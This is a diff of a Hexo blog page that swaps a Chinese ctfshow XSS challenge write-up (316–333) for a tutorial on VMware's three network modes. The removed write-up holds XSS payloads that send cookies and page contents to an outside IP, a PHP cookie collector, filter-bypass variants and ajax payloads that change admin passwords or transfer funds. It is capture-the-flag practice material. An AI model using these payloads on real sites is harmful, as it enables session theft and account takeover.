@@ -8,7 +8,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    ctfshow  web入门之xss |  Wh1tecell&#39;blog
+    vmware三种网络工作模式 |  Wh1tecell&#39;blog
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -44,7 +44,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-ctfshow-web入门之xss"
+  id="post-vmware三种网络工作模式"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -55,18 +55,18 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  ctfshow  web入门之xss
+  vmware三种网络工作模式
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2021/06/08/ctfshow-web%E5%85%A5%E9%97%A8%E4%B9%8Bxss/" class="article-date">
-  <time datetime="2021-06-08T10:33:59.000Z" itemprop="datePublished">2021-06-08</time>
+      <a href="/2021/06/01/vmware%E4%B8%89%E7%A7%8D%E7%BD%91%E7%BB%9C%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/" class="article-date">
+  <time datetime="2021-06-01T08:47:09.000Z" itemprop="datePublished">2021-06-01</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98%E7%AB%99/">刷题站</a> / <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98%E7%AB%99/ctfshow/">ctfshow</a>
+    <a class="article-category-link" href="/categories/%E5%85%B6%E5%AE%83/">其它</a> / <a class="article-category-link" href="/categories/%E5%85%B6%E5%AE%83/vmware/">vmware</a>
   </div>
   
 <div class="word_count">
@@ -74,7 +74,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">1k</span>
+            <span class="post-count">2k</span>
         </span>
     </span>
 
@@ -83,7 +83,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">4 分钟</span>
+            <span class="post-count">6 分钟</span>
         </span>
     </span>
 </div>
@@ -98,75 +98,79 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="316"><a class="header-anchor" href="#316">¶</a>316</h2>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location.href&#x3D;&#39;http:&#x2F;&#x2F;112.124.39.118&#x2F;x.php?1&#x3D;&#39;+document.cookie&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-<p>x.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">  file_put_contents(<span class="string">&#x27;/tmp/flag.txt&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;no file&quot;</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>然后去自己的vps的/tmp/flag.txt  看  发现了flag</p>
-<h2 id="317"><a class="header-anchor" href="#317">¶</a>317</h2>
-<p>应该是过滤了 <code>&lt;script&gt;</code>标签</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload&#x3D;&quot;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;112.124.39.118&#x2F;x.php?1&#x3D;&#39;+document.cookie&quot;&gt;&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;body onload&#x3D;&quot;document.location.href&#x3D;&#39;http:&#x2F;&#x2F;112.124.39.118&#x2F;x.php?1&#x3D;&#39;+document.cookie&quot;&gt;&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>
-<p>上面这两个都行</p>
-<h2 id="318"><a class="header-anchor" href="#318">¶</a>318</h2>
-<p>同317</p>
-<h2 id="319"><a class="header-anchor" href="#319">¶</a>319</h2>
-<p>同317</p>
-<h2 id="320"><a class="header-anchor" href="#320">¶</a>320</h2>
-<p>多过滤了空格 用  /**/  替换空格</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&#x2F;**&#x2F;onload&#x3D;&quot;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;112.124.39.118&#x2F;x.php?1&#x3D;&#39;+document.cookie&quot;&gt;&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="321"><a class="header-anchor" href="#321">¶</a>321</h2>
-<p>同320</p>
-<h2 id="322"><a class="header-anchor" href="#322">¶</a>322</h2>
-<p>同320</p>
-<h2 id="323"><a class="header-anchor" href="#323">¶</a>323</h2>
-<p>同320</p>
-<h2 id="324"><a class="header-anchor" href="#324">¶</a>324</h2>
-<p>同320</p>
-<h2 id="325"><a class="header-anchor" href="#325">¶</a>325</h2>
-<p>同320</p>
-<h2 id="326"><a class="header-anchor" href="#326">¶</a>326</h2>
-<p>同320</p>
-<h2 id="327"><a class="header-anchor" href="#327">¶</a>327</h2>
-<p>存储型 xss</p>
-<p>收件人得是 admin 否则发送不成功</p>
-<p>信的内容放paylaod</p>
-<p>payload还是 320</p>
-<h2 id="328"><a class="header-anchor" href="#328">¶</a>328</h2>
-<p>在注册用户的地方 密码放进payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;112.124.39.118&#x2F;x.php?1&#x3D;&#39;+document.cookie;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-<p>在vps上获取 管理员 cookie  然后成功以admin的身份登录</p>
-<p>然后抓包获取 flag</p>
-<h2 id="329"><a class="header-anchor" href="#329">¶</a>329</h2>
-<p>这里获取cookie并没有用</p>
-<p>因为每次一获取 管理员就会登出 导致cookie每次都不一样 我们这里使用js 获取页面信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$(&#39;.layui-table-cell laytable-cell-1-0-1&#39;).each(function(index,value)&#123;if(value.innerHTML.indexof(&#39;ctf&#39;+&#39;show&#123;&#39;)&gt;-1&#123;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;112.124.39.118&#x2F;x.php?1&#x3D;&#39;+value.innerHTML;&#125;&#125;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var img &#x3D; new Image();img.src &#x3D; “http:&#x2F;&#x2F;112.124.39.118&#x2F;xx.php?1&#x3D;”+document.querySelector(’#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main’).textContent;document.body.append(img);</span><br></pre></td></tr></table></figure>
-<p>下面这一种直接 nc监听就行了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#39;http:&#x2F;&#x2F;112.124.39.118:9911&#x2F;&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="330"><a class="header-anchor" href="#330">¶</a>330</h2>
-<p>多了个修改密码功能，为GET请求<br>
-注册用户名：<code>&lt;script&gt;window.location.href='http://127.0.0.1/api/change.php?p=123';&lt;/script&gt;</code><br>
-密码：随意<br>
-提交，然后等10s用管理员账户登录<br>
-再然后就可以看到flag了</p>
-<p>也可以用下面的方法注册</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;api&#x2F;change.php?p&#x3D;111111&quot;,success:function(result)&#123;&#125;&#125;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-<p>**补充  **</p>
-<p>ajax也就是异步</p>
-<p>这个要跟同步的概念一起理解，举个同步的例子<br>
-就是当你浏览页面的时候，你点击一个按钮或者链接，那么这个界面就会向服务器发送请求，此时你眼前的界面就是一片空白，直到请求的数据返回页面上才有东西显示。就是一个操作要等前一个做完才可以开始。<br>
-而异步则不同，比如一个注册页面<br>
-你填写名字，密码，邮箱之类的信息，界面看上去什么都没有变化，但是其实你注册的这个界面已经向服务器发送了一个请求来验证你的用户名是否已经存在。就是后台与界面可以进行数据交互，而界面则可以继续保持一直跟用户交互而不受影响。</p>
-<h2 id="331"><a class="header-anchor" href="#331">¶</a>331</h2>
-<p>改成 post方式就行</p>
-<p>(记得加上script标签)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url: &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;api&#x2F;change.php&quot;,method: &quot;POST&quot;,data:&#123;&#39;p&#39;:&#39;111111&#39;&#125;,cache: false,success: function(res)&#123;&#125;&#125;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="332"><a class="header-anchor" href="#332">¶</a>332</h2>
-<p>向admin转账 -10000 自己就获得 10000了</p>
-<p>逻辑漏洞</p>
-<h2 id="333"><a class="header-anchor" href="#333">¶</a>333</h2>
-<p>注册用户用下面这个 payload  管理员就会给我们自己转10000元</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;api&#x2F;amount.php&quot;,method:&quot;POST&quot;,data:&#123;&#39;u&#39;:&#39;12&#39;,&#39;a&#39;:10000&#125;,cache: false,success: function(res)&#123;&#125;&#125;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+  <h1>vmware三种网络工作模式</h1>
+<p>转自:<a target="_blank" rel="noopener" href="https://www.linuxidc.com/Linux/2016-09/135521.htm">https://www.linuxidc.com/Linux/2016-09/135521.htm</a></p>
+<p>vmware为我们提供了三种网络工作模式，它们分别是：<strong>Bridged（桥接模式）</strong>、<strong>NAT（网络地址转换模式）</strong>、<strong>Host-Only（仅主机模式）</strong>。</p>
+<p>打开vmware虚拟机，我们可以在选项栏的“编辑”下的“虚拟网络编辑器”中看到VMnet0（桥接模式）、VMnet1（仅主机模式）、VMnet8（NAT模式），那么这些都是有什么作用呢？其实，我们现在看到的VMnet0表示的是用于桥接模式下的虚拟交换机；VMnet1表示的是用于仅主机模式下的虚拟交换机；VMnet8表示的是用于NAT模式下的虚拟交换机。</p>
+<p><img src="https://www.linuxidc.com/upload/2016_09/160926204625482.png" alt="虚拟网络编辑器"></p>
+<p>同时，在主机上对应的有VMware Network Adapter VMnet1和VMware Network Adapter VMnet8两块虚拟网卡，它们分别作用于仅主机模式与NAT模式下。在“网络连接”中我们可以看到这两块虚拟网卡，如果将这两块卸载了，可以在vmware的“编辑”下的“虚拟网络编辑器”中点击“还原默认设置”，可重新将虚拟网卡还原。</p>
+<p><img src="https://www.linuxidc.com/upload/2016_09/160926204625483.png" alt="还原默认设置"></p>
+<p>小伙伴看到这里，肯定有疑问，为什么在真机上没有VMware Network Adapter VMnet0虚拟网卡呢？那么接下来，我们就一起来看一下这是为什么。</p>
+<h2 id="一、Bridged（桥接模式）"><a class="header-anchor" href="#一、Bridged（桥接模式）">¶</a>一、Bridged（桥接模式）</h2>
+<p>什么是桥接模式？桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。其网络结构如下图所示：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/14acd50fe89a84932f68f097befe0d5d.png" alt="桥接模式"></p>
+<p>接下来，我们就来实际操作，如何设置桥接模式。</p>
+<p>首先，安装完系统之后，在开启系统之前，点击“编辑虚拟机设置”来设置网卡模式。</p>
+<p>点击“网络适配器”，选择“桥接模式”，然后“确定”</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/584d7d199eda6c406db75ba3f1e081b9.png" alt="网络适配器"></p>
+<p>在进入系统之前，我们先确认一下主机的ip地址、网关、DNS等信息。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b8dfa83a47f1603ac5658be03bea949c.png" alt="主机信息"></p>
+<p>然后，进入系统编辑网卡配置文件，命令为vi /etc/sysconfig/network-scripts/ifcfg-eth0</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3d5cd52c0e3c5426fa13d38a9e5c2c33.png" alt="编辑网卡配置文件"></p>
+<p>添加内容如下：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a52bbfd90132b544824d58af99acbd0b.png" alt="添加内容"></p>
+<p>编辑完成，保存退出，然后重启虚拟机网卡，使用ping命令ping外网ip，测试能否联网。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d92ed70aa72075f498c2d4d2bc5b76fd.png" alt="测试能否联网"></p>
+<p>能ping通外网ip，证明桥接模式设置成功。</p>
+<p>那主机与虚拟机之间的通信是否正常呢？我们就用xshell来测试 发现主机与虚拟机通信正常。</p>
+<p>这就是桥接模式的设置步骤，相信大家应该学会了如何去设置桥接模式了。桥接模式配置简单，但如果你的网络环境是ip资源很缺少或对ip管理比较严格的话，那桥接模式就不太适用了。如果真是这种情况的话，我们该如何解决呢？接下来，我们就来认识vmware的另一种网络模式：NAT模式。</p>
+<h2 id="二、NAT（地址转换模式）"><a class="header-anchor" href="#二、NAT（地址转换模式）">¶</a>二、NAT（地址转换模式）</h2>
+<p><strong>路由器使用叫做NAT(网络地址转换)的方式，将它所接的外网数据包转发给内网的计算机（内网ip+端口），从而实现多个计算机上网。</strong><br>
+<strong>“路由器”作为一种世面售卖的硬件，其实不是单纯的路由器，而是集合了路由器、交换机、dhcp、nat、网关、dns、防火墙等功能的一种设备。</strong><br>
+<strong>你的网关是路由器作为内网的地址。你的公网ip是运营商分配给你的地址（路由器外网地址），你的计算机的地址，是路由器作为dhcp动态分配的内网地址。</strong></p>
+<p>刚刚我们说到，如果你的网络ip资源紧缺，但是你又希望你的虚拟机能够联网，这时候NAT模式是最好的选择。NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网。其网络结构如下图所示：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/60902cfd2471c23e71a5865dab19af90.png" alt="NAT模式"></p>
+<p>在NAT模式中，主机网卡直接与虚拟NAT设备相连，然后虚拟NAT设备与虚拟DHCP服务器一起连接在虚拟交换机VMnet8上，这样就实现了虚拟机联网。那么我们会觉得很奇怪，为什么需要虚拟网卡VMware Network Adapter VMnet8呢？原来我们的VMware Network Adapter VMnet8虚拟网卡主要是为了实现主机与虚拟机之间的通信。在之后的设置步骤中，我们可以加以验证。</p>
+<p>首先，设置虚拟机中NAT模式的选项，打开vmware，点击“编辑”下的“虚拟网络编辑器”，设置NAT参数及DHCP参数。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/cf9afd8affca8d2cf5b6d2b9b317ab4d.png" alt="虚拟网络编辑器"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/4c9b9d354b0709d9b9fd011198a8f970.png" alt="NAT参数"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/ca13ff157a76c3dbd326d4c46261ba93.png" alt="DHCP参数"></p>
+<p>将虚拟机的网络连接模式修改成NAT模式，点击“编辑虚拟机设置”。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e091444b0667948492da425aa4f20541.png" alt="编辑虚拟机设置"></p>
+<p>点击“网络适配器”，选择“NAT模式”</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f75d5b63129d2c7c5376a5356391ff32.png" alt="NAT模式"></p>
+<p>然后开机启动系统，编辑网卡配置文件，命令为vi /etc/sysconfig/network-scripts/ifcfg-eth0</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/ec72cfa2e918ad4694aba19fcfc4d633.png" alt="编辑网卡配置文件"></p>
+<p>具体配置如下：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/35b98681bf14a1d17c3f79203bd7e467.png" alt="具体配置"></p>
+<p>编辑完成，保存退出，然后重启虚拟机网卡，动态获取ip地址，使用ping命令ping外网ip，测试能否联网。</p>
+<p>之前，我们说过VMware Network Adapter VMnet8虚拟网卡的作用，那我们现在就来测试一下。</p>
+<p><img src="https://www.linuxidc.com/upload/2016_09/1609262046644510.png" alt="虚拟网卡禁用"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/167ff916fb40fde4a2984c513023d8b6.png" alt="是否能ping通"></p>
+<p>如此看来，虚拟机能联通外网，确实不是通过VMware Network Adapter VMnet8虚拟网卡，那么为什么要有这块虚拟网卡呢？</p>
+<p>之前我们就说VMware Network Adapter VMnet8的作用是主机与虚拟机之间的通信，接下来，我们就用远程连接工具来测试</p>
+<p>然后，将VMware Network Adapter VMnet8启用之后，发现远程工具 xshell可以连接上虚拟机了。</p>
+<p>那么，这就是NAT模式，利用虚拟的NAT设备以及虚拟DHCP服务器来使虚拟机连接外网，而VMware Network Adapter VMnet8虚拟网卡是用来与虚拟机通信的</p>
+<h2 id="三、Host-Only（仅主机模式）"><a class="header-anchor" href="#三、Host-Only（仅主机模式）">¶</a>三、Host-Only（仅主机模式）</h2>
+<p>Host-Only模式其实就是NAT模式去除了虚拟NAT设备，然后使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。其网络结构如下图所示：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/ba1fcb83db4e9c83bccd02e4eaf68eb4.png" alt="Host-Only模式"></p>
+<p>通过上图，我们可以发现，如果要使得虚拟机能联网，我们可以将主机网卡共享给VMware Network Adapter VMnet1网卡，从而达到虚拟机联网的目的。接下来，我们就来测试一下。</p>
+<p>首先设置“虚拟网络编辑器”，可以设置DHCP的起始范围。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7a1cf5c6e89043463a4d0524f7582121.png" alt="虚拟网络编辑器"></p>
+<p>设置虚拟机为Host-Only模式。</p>
+<p>开机启动系统，然后设置网卡文件。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6b36c40170113edfbec38b79ab344799.png" alt="设置网卡文件"></p>
+<p>保存退出，然后重启网卡，利用xshell测试能否与主机通信。</p>
+<p>发现主机与虚拟机之间可以通信，现在设置虚拟机联通外网。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/36103d480eb74a8cbaca3383d1151961.png" alt="设置虚拟机联通外网"></p>
+<p>我们可以看到上图有一个提示，强制将VMware Network Adapter VMnet1的ip设置成192.168.137.1，那么接下来，我们就要将虚拟机的DHCP的子网和起始地址进行修改，点击“虚拟网络编辑器”</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d63c7f1dd1ee6cd2213b8fbc47f0eac1.png" alt="虚拟网络编辑器"></p>
+<p>重新配置网卡，将VMware Network Adapter VMnet1虚拟网卡作为虚拟机的路由。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0de2b7f52e512efde510553c4e4bed4d.png" alt="重新配置网卡"></p>
+<p>重启网卡，然后通过 远程工具测试能否联通外网以及与主机通信。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d4a955bbc254388faa79565387c70ce6.png" alt="远程工具测试"></p>
+<p>测试结果证明可以使得虚拟机连接外网。</p>
+<p>以上就是关于VMware三种网络模式的工作原理及配置详解。</p>
  
       <!-- reward -->
       
@@ -231,7 +235,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://wh1tecell.top/2021/06/08/ctfshow-web%E5%85%A5%E9%97%A8%E4%B9%8Bxss/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://wh1tecell.top/2021/06/01/vmware%E4%B8%89%E7%A7%8D%E7%BD%91%E7%BB%9C%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -242,19 +246,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2021/06/17/Vulnhub%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" class="article-nav-link">
+      <a href="/2021/06/06/CTFSHOW%E4%B9%8B%E5%A4%A7%E7%89%9B%E6%9D%AF/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            Vulnhub靶场练习
+            CTFSHOW之大牛杯
           
         </div>
       </a>
     
     
-      <a href="/2021/06/06/CTFSHOW%E4%B9%8B%E5%A4%A7%E7%89%9B%E6%9D%AF/" class="article-nav-link">
+      <a href="/2021/05/30/CISCN2019Web1-Dropbox%E6%B7%B1%E5%BA%A6%E8%A7%A3%E8%AF%BB/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">CTFSHOW之大牛杯</div>
+        <div class="article-nav-title">CISCN2019Web1 Dropbox深度解读</div>
       </a>
     
   </nav>
